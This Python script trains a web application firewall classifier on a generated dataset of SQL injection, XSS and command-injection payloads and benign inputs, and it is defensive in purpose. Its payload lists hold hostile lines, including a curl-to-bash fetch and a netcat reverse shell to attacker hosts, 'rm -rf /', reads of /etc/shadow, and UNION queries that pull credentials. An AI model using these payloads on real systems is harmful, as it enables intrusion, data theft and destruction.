import os
import re
import math
import pickle
import pandas as pd
import numpy as np

# Try importing ML libraries
try:
    import torch
    from torch.utils.data import Dataset
    from transformers import DistilBertTokenizer, DistilBertForSequenceClassification, Trainer, TrainingArguments
    TRANSFORMERS_AVAILABLE = True
except ImportError:
    TRANSFORMERS_AVAILABLE = False

from sklearn.model_selection import train_test_split
from sklearn.feature_extraction.text import TfidfVectorizer
from sklearn.linear_model import LogisticRegression
from sklearn.metrics import classification_report, accuracy_score

# 1. Dataset Generation Functions
def generate_attack_dataset():
    """
    Generates a balanced dataset of benign and malicious payloads:
    SQLi (class 1), XSS (class 1), Command Injection (class 1), Benign (class 0)
    """
    sqli_templates = [
        "1' OR '1'='1",
        "admin' --",
        "admin' #",
        "1' OR 1=1--",
        "1' OR 1=1#",
        "' OR 'a'='a",
        "1 UNION SELECT null, username, password FROM users",
        "1 UNION SELECT 1,2,3,4,5",
        "'; DROP TABLE products; --",
        "1' AND 1=2",
        "1' AND 5=5",
        "admin' AND '1'='1",
        "1' OR sleep(5)#",
        "1' OR extractvalue(1, concat(0x7e, (select database())))#",
        "1' OR 1=1 LIMIT 1 --",
        "SELECT * FROM users WHERE username = 'admin' AND password = '1'",
        "UNION SELECT NULL, @@version, NULL --",
        "1 AND (SELECT 9385 FROM(SELECT COUNT(*),CONCAT(0x7178786b71,(SELECT (ELT(9385=9385,1))),0x7170707671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)",
    ]

    xss_templates = [
        "<script>alert(1)</script>",
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert(1)>",
        "<img src=\"javascript:alert('XSS');\">",
        "<svg onload=alert(1)>",
        "<body onload=alert('XSS')>",
        "<iframe src=\"javascript:alert(1)\">",
        "<a href=\"javascript:alert(1)\">Click me</a>",
        "';alert(1);'",
        "\" onclick=\"alert(1)\"",
        "<script src=\"http://attacker.com/malicious.js\"></script>",
        "<div onmouseover=\"alert('XSS')\">",
        "<input type=\"text\" value=\"\" onfocus=\"alert(1)\">",
        "<form action=\"javascript:alert(1)\">",
        "&lt;script&gt;alert(1)&lt;/script&gt;",
        "<img src=1 href=1 onerror=\"javascript:alert(1)\"></img>",
    ]

    cmd_templates = [
        "; rm -rf /",
        "; cat /etc/passwd",
        "&& ls -la",
        "| whoami",
        "|| id",
        "& ping -c 4 8.8.8.8",
        "; wget http://attacker.com/malicious_file -O /tmp/file",
        "; curl http://attacker.com/shell.sh | bash",
        "; nc -e /bin/sh 10.0.0.1 4444",
        "&& cat /etc/shadow",
        "| grep -i admin",
        "; echo 'malicious' > /var/www/html/shell.php",
        "; uname -a",
        "&& ipconfig /all",
        "| dir C:\\",
        "& cd .. && ls",
    ]

    benign_templates = [
        "best laptop for programming",
        "leather wallet for men",
        "wireless mouse and keyboard bundle",
        "how to learn python in 2026",
        "standard login credentials",
        "john.doe@example.com",
        "https://google.com",
        '{"name": "Alice", "age": 30, "city": "Seattle"}',
        "user_profile_id_9481",
        "select a size for your shirt",
        "clean code developer book",
        "MGIT College, Hyderabad, India",
        "Web Application Firewall project",
        "spring boot RestTemplate example",
        "hello world application",
        "what is the weather today",
        "12345",
        "my password is very secure",
        "{\"search\":\"gaming laptop\",\"category\":\"electronics\",\"page\":2}",
        "GET /api/v1/products?category=books&sort=price_asc HTTP/1.1",
        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp",
        "Connection: keep-alive",
        "Host: localhost:8080",
    ]

    # Generate more data by combining templates and variations
    data = []
    
    # Add explicit base templates
    for payload in sqli_templates:
        data.append({"payload": payload, "label": 1, "type": "SQLi"})
    for payload in xss_templates:
        data.append({"payload": payload, "label": 1, "type": "XSS"})
    for payload in cmd_templates:
        data.append({"payload": payload, "label": 1, "type": "Command Injection"})
    for payload in benign_templates:
        data.append({"payload": payload, "label": 0, "type": "Benign"})

    # Expand the dataset with permutations to make it robust (approx 1200 samples)
    words = ["user", "admin", "product", "search", "id", "item", "category", "data", "test", "submit", "token"]
    sql_keywords = ["SELECT", "UNION", "INSERT", "DELETE", "DROP", "UPDATE", "WHERE", "FROM", "OR", "AND", "LIKE"]
    html_tags = ["div", "img", "span", "p", "a", "body", "iframe", "input", "svg"]
    cmd_cmds = ["cat", "ls", "dir", "whoami", "id", "ping", "wget", "curl", "rm", "echo"]

    # Generate synthetic SQLi
    for i in range(300):
        w = np.random.choice(words)
        kw = np.random.choice(sql_keywords)
        val = np.random.randint(1, 1000)
        p_type = np.random.choice(["simple", "union", "drop"])
        if p_type == "simple":
            payload = f"{w}' OR {kw} '{np.random.choice(words)}'='{np.random.choice(words)}"
        elif p_type == "union":
            payload = f"{val} UNION {kw} {np.random.randint(1,5)},{np.random.randint(1,5)} FROM {np.random.choice(words)}"
        else:
            payload = f"'; {kw} TABLE {np.random.choice(words)}; --"
        data.append({"payload": payload, "label": 1, "type": "SQLi"})

    # Generate synthetic XSS
    for i in range(300):
        tag = np.random.choice(html_tags)
        evt = np.random.choice(["onerror", "onload", "onclick", "onmouseover", "onfocus"])
        payload_opts = [
            f"<{tag} {evt}=alert(1)>",
            f"<{tag} {evt}=\"javascript:alert(1)\">",
            f"javascript:alert('{np.random.choice(words)}')",
            f"\"><{tag}>{evt}=alert(1)</{tag}>",
            f"<{tag} src=\"javascript:eval(window.name)\">",
        ]
        data.append({"payload": np.random.choice(payload_opts), "label": 1, "type": "XSS"})

    # Generate synthetic Command Injection
    for i in range(300):
        sep = np.random.choice([";", "&&", "|", "||", "&"])
        cmd = np.random.choice(cmd_cmds)
        arg = np.random.choice(["/etc/passwd", "-la", "8.8.8.8", "shell.sh", "C:\\", "/"])
        payload = f"{np.random.choice(words)} {sep} {cmd} {arg}"
        data.append({"payload": payload, "label": 1, "type": "Command Injection"})

    # Generate synthetic Benign
    for i in range(900):
        # Generate simple phrases
        phrase_len = np.random.randint(2, 6)
        phrase = " ".join([np.random.choice(benign_templates).split()[0] for _ in range(phrase_len)])
        # Sometimes email or simple query
        if i % 3 == 0:
            payload = f"{np.random.choice(words)}_{np.random.randint(1,100)}@{np.random.choice(words)}.com"
        elif i % 3 == 1:
            payload = f"/{np.random.choice(words)}/{np.random.randint(100,999)}?search={phrase.replace(' ', '+')}"
        else:
            payload = phrase
        data.append({"payload": payload, "label": 0, "type": "Benign"})

    df = pd.DataFrame(data)
    df.to_csv("dataset.csv", index=False)
    print(f"Generated synthetic dataset: {len(df)} samples saved to 'dataset.csv'")
    return df

# 2. Heuristic Feature Extraction for analysis
def extract_features(text):
    """
    Computes statistical and keyword features for logging and fallback classification
    """
    text = str(text)
    length = len(text)
    
    # Entropy calculation
    entropy = 0
    if length > 0:
        chars = {}
        for c in text:
            chars[c] = chars.get(c, 0) + 1
        for count in chars.values():
            p = count / length
            entropy -= p * math.log2(p)
            
    # Counts
    special_chars = re.findall(r"['\"<>;\(\)\-\-\/\\\*\&\|\$\=\!]", text)
    special_char_count = len(special_chars)
    
    encoded_patterns = re.findall(r"(%[0-9a-fA-F]{2}|\\x[0-9a-fA-F]{2}|&#[0-9]+;)", text)
    encoded_pattern_count = len(encoded_patterns)
    
    keywords = ["select", "union", "insert", "drop", "delete", "script", "onerror", "onload", "javascript", "eval", "exec", "wget", "curl", "bash", "cmd.exe"]
    suspicious_keyword_presence = sum(1 for kw in keywords if kw in text.lower())
    
    script_tags = re.findall(r"(<script|javascript:|onload=|onerror=|onclick=)", text.lower())
    script_tag_frequency = len(script_tags)
    
    return {
        "request_length": length,
        "payload_entropy": round(entropy, 4),
        "special_character_count": special_char_count,
        "encoded_pattern_count": encoded_pattern_count,
        "suspicious_keyword_presence": suspicious_keyword_presence,
        "script_tag_frequency": script_tag_frequency
    }

# 3. Transformer Dataset Helper
if TRANSFORMERS_AVAILABLE:
    class WafDataset(Dataset):
        def __init__(self, encodings, labels):
            self.encodings = encodings
            self.labels = labels

        def __getitem__(self, idx):
            item = {key: torch.tensor(val[idx]) for key, val in self.encodings.items()}
            item['labels'] = torch.tensor(self.labels[idx])
            return item

        def __len__(self):
            return len(self.labels)

# 4. Main Training Routine
def main():
    # Setup working dir
    script_dir = os.path.dirname(os.path.abspath(__file__))
    os.chdir(script_dir)
    
    # Generate/Load dataset
    if not os.path.exists("dataset.csv"):
        df = generate_attack_dataset()
    else:
        df = pd.read_csv("dataset.csv")
        print(f"Loaded existing dataset: {len(df)} samples")

    X = df["payload"].astype(str).tolist()
    y = df["label"].tolist()

    # Split dataset
    X_train, X_test, y_train, y_test = train_test_split(X, y, test_size=0.20, random_state=42)

    # Always train the Fallback ML Model first (fast, reliable)
    print("\n--- Training Fallback ML Model (TF-IDF + Logistic Regression) ---")
    vectorizer = TfidfVectorizer(ngram_range=(1, 3), min_df=2, analyzer='char_wb')
    X_train_vec = vectorizer.fit_transform(X_train)
    X_test_vec = vectorizer.transform(X_test)

    lr_model = LogisticRegression(max_iter=1000)
    lr_model.fit(X_train_vec, y_train)

    y_pred = lr_model.predict(X_test_vec)
    print(f"Fallback Model Accuracy: {accuracy_score(y_test, y_pred) * 100:.2f}%")
    print(classification_report(y_test, y_pred))

    # Save fallback model
    with open("fallback_model.pkl", "wb") as f:
        pickle.dump(lr_model, f)
    with open("fallback_vectorizer.pkl", "wb") as f:
        pickle.dump(vectorizer, f)
    print("Fallback ML model and vectorizer saved successfully!")

    # Train Transformer model if packages are available
    if TRANSFORMERS_AVAILABLE:
        print("\n--- Training Transformer Model (DistilBERT) ---")
        try:
            model_name = "distilbert-base-uncased"
            print(f"Loading pretrained tokenizer: {model_name}...")
            tokenizer = DistilBertTokenizer.from_pretrained(model_name)
            
            print("Tokenizing payloads...")
            train_encodings = tokenizer(X_train, truncation=True, padding=True, max_length=128)
            test_encodings = tokenizer(X_test, truncation=True, padding=True, max_length=128)

            train_dataset = WafDataset(train_encodings, y_train)
            test_dataset = WafDataset(test_encodings, y_test)

            print("Loading pre-trained DistilBERT model...")
            model = DistilBertForSequenceClassification.from_pretrained(model_name, num_labels=2)

            # Determine device
            device = "cuda" if torch.cuda.is_available() else "cpu"
            print(f"Training will run on device: {device.upper()}")
            
            # Simple training arguments for faster execution
            training_args = TrainingArguments(
                output_dir='./results',
                num_train_epochs=3,
                per_device_train_batch_size=16,
                per_device_eval_batch_size=16,
                warmup_steps=100,
                weight_decay=0.01,
                logging_dir='./logs',
                logging_steps=50,
                evaluation_strategy="epoch",
                save_strategy="epoch",
                load_best_model_at_end=True,
                metric_for_best_model="accuracy",
                report_to="none" # Disable logging to external tools (wandb etc.)
            )

            # Define compute metrics
            def compute_metrics(eval_pred):
                logits, labels = eval_pred
                predictions = np.argmax(logits, axis=-1)
                return {"accuracy": accuracy_score(labels, predictions)}

            trainer = Trainer(
                model=model,
                args=training_args,
                train_dataset=train_dataset,
                eval_dataset=test_dataset,
                compute_metrics=compute_metrics
            )

            print("Starting training...")
            trainer.train()
            
            print("Evaluating DistilBERT model...")
            eval_results = trainer.evaluate()
            print(f"Transformer Model Accuracy: {eval_results['eval_accuracy'] * 100:.2f}%")

            # Save the fine-tuned model
            save_path = "./waf_model"
            os.makedirs(save_path, exist_ok=True)
            model.save_pretrained(save_path)
            tokenizer.save_pretrained(save_path)
            print(f"DistilBERT model and tokenizer saved to '{save_path}'!")
            
        except Exception as e:
            print(f"\n[WARNING] Transformer training failed: {e}")
            print("WAF will utilize the Fallback ML model during startup.")
    else:
        print("\n[INFO] PyTorch or Transformers package not available. Skipping DistilBERT model training.")
        print("To enable DistilBERT training, install pytorch and transformers:")
        print("pip install torch transformers")

if __name__ == "__main__":
    main()
